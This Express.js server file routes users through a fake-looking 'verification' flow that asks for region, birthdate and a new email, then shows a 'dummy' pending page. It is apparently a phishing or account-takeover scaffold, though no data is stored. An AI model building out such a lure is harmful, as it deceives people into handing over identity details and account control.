const express = require('express');
const path = require('path');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Home Page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// 1. Region / Verification Locate Page
app.get('/verificationlocate', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'verificationlocate.html'));
});

app.post('/api/locate', (req, res) => {
  const { region } = req.body;
  // Save region data to SQLite / DB here if needed
  res.redirect('/birthday');
});

// 2. Birthday Page
app.get('/birthday', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'birthday.html'));
});

app.post('/api/birthday', (req, res) => {
  const { birthdate } = req.body;
  // Save birthdate data to DB here if needed
  res.redirect('/newemail');
});

// 3. New Email (No Password) Page
app.get('/newemail', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'newemail.html'));
});

app.post('/api/newemail', (req, res) => {
  const { newEmail } = req.body;
  // Save new email to DB here if needed
  res.redirect('/pending');
});

// 4. Dummy Status Page
app.get('/pending', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'pending.html'));
});

// Fallback / Start
app.get('/', (req, res) => {
  res.redirect('/verificationlocate');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
